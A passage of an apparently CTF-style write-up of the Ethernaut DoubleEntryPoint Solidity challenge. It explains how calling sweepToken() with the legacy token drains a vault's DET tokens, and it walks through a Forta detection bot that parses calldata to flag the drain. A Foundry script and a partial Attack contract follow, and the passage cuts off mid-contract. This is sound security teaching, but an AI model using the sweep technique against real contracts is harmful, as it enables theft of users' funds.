&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sweepToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;IERC20 token&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;underlying&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can&amp;#39;t transfer underlying token&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(sweptTokensRecipient&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;16&quot;&gt;
&lt;li&gt;To make the LegacyToken &lt;code&gt;tranfer()&lt;&#x2F;code&gt; called by the CryptoVault, we need to pass the LegacyToken instance to the &lt;code&gt;sweepToken()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;Now the CryptoVault balance of DET token becomes zero.&lt;&#x2F;li&gt;
&lt;li&gt;We identified the bug and sweeped out the DET tokens of the CryptoVault.&lt;&#x2F;li&gt;
&lt;li&gt;Now we have to write a &lt;code&gt;detectionbot&lt;&#x2F;code&gt; to catch this bug. We are given with &lt;code&gt;Forta&lt;&#x2F;code&gt; interface which can be used to build the bot.&lt;&#x2F;li&gt;
&lt;li&gt;We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;msg.data&lt;&#x2F;code&gt; that received at &lt;code&gt;fortNotify()&lt;&#x2F;code&gt;,&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;data = &amp;lt;delegateTransfer() signature&amp;gt; &amp;lt;to&amp;gt; &amp;lt;value&amp;gt; &amp;lt;origSender&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;22&quot;&gt;
&lt;li&gt;If we access &lt;code&gt;msg.data&lt;&#x2F;code&gt; inside &lt;code&gt;handleTransaction()&lt;&#x2F;code&gt;,&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;msg.data = &amp;lt;handleTransaction() signature&amp;gt; &amp;lt;user&amp;gt; &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;23&quot;&gt;
&lt;li&gt;We need to extract &lt;code&gt;origSender&lt;&#x2F;code&gt; from the &lt;code&gt;msg.data&lt;&#x2F;code&gt; inside &lt;code&gt;handleTransaction()&lt;&#x2F;code&gt; function implemented in our bot contract.&lt;&#x2F;li&gt;
&lt;li&gt;Lets see how the calldata at &lt;code&gt;handleTransaction()&lt;&#x2F;code&gt; is looks like,&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;0x00 : handleTransaction signature[4 bytes]
&lt;&#x2F;span&gt;&lt;span&gt;0x04 : 0000....0000 &#x2F;&#x2F; &amp;lt;user&amp;gt; address
&lt;&#x2F;span&gt;&lt;span&gt;0x24 : 0000....0000 &#x2F;&#x2F; offset of the &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;0x44 : 0000....0000 &#x2F;&#x2F; length of the &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;0x64 : 0000....0000 &#x2F;&#x2F; &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    0x64 : &amp;lt;delegateTransfer() signature&amp;gt; [4 bytes]
&lt;&#x2F;span&gt;&lt;span&gt;    0x68 : 0000....0000 &#x2F;&#x2F; &amp;lt;to&amp;gt; address
&lt;&#x2F;span&gt;&lt;span&gt;    0x88 : 0000....0000 &#x2F;&#x2F; &amp;lt;value&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    0xA8 : 0000....0000 &#x2F;&#x2F; &amp;lt;origSender&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;25&quot;&gt;
&lt;li&gt;So, the &lt;code&gt;origSender&lt;&#x2F;code&gt; is from the &lt;code&gt;0xA8&lt;&#x2F;code&gt; byte of the &lt;code&gt;msg.data&lt;&#x2F;code&gt; inside &lt;code&gt;handleTransaction()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;We can use &lt;code&gt;calldataload&lt;&#x2F;code&gt; opcode to access the &lt;code&gt;origSender&lt;&#x2F;code&gt;. And if the origSender is equals to CryptoVault then raise an alert.&lt;&#x2F;li&gt;
&lt;li&gt;Now our bot is ready, we have to deploy it and register the bot at &lt;code&gt;Forta&lt;&#x2F;code&gt; contract.&lt;&#x2F;li&gt;
&lt;li&gt;And that&#x27;s enough to solve this challenge.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;DoubleEntryPointSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;DoubleEntryPoint.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DoubleEntryPointSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    DoubleEntryPoint public det &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DoubleEntryPoint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address cryptovault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cryptoVault&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;player&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        address delegatedFrom &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatedFrom&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Legacy Token Address
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CryptoVault : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;cryptovault)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Player : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;player)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;LGT : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;delegatedFrom)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        LegacyToken lgt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;LegacyToken&lt;&#x2F;span&gt;&lt;span&gt;(delegatedFrom)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        CryptoVault cv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;CryptoVault&lt;&#x2F;span&gt;&lt;span&gt;(cryptovault)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CryptoVault balance of DET : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(cryptovault))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CryptoVault balance of LGT : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;lgt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(cryptovault))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Delegate of LGT : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(lgt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegate&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;DET : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(det))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Both are same&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Forta forta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forta&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;registering bot.........&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        DetectionBot bot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;DetectionBot&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setDetectionBot&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(bot))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BOT ALERTS Before exploit : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(bot)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Exploiting DET...........&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; new Attack().exploit();  &#x2F;&#x2F; reverts because bot detects the exploit
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CryptoVault balance of DET : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(cryptovault))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;BOT ALERTS After exploit : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;forta&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;botRaisedAlerts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(bot)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    DoubleEntryPoint public det &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;DoubleEntryPoint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public  cryptovault &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cryptoVault&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;det&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;player&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
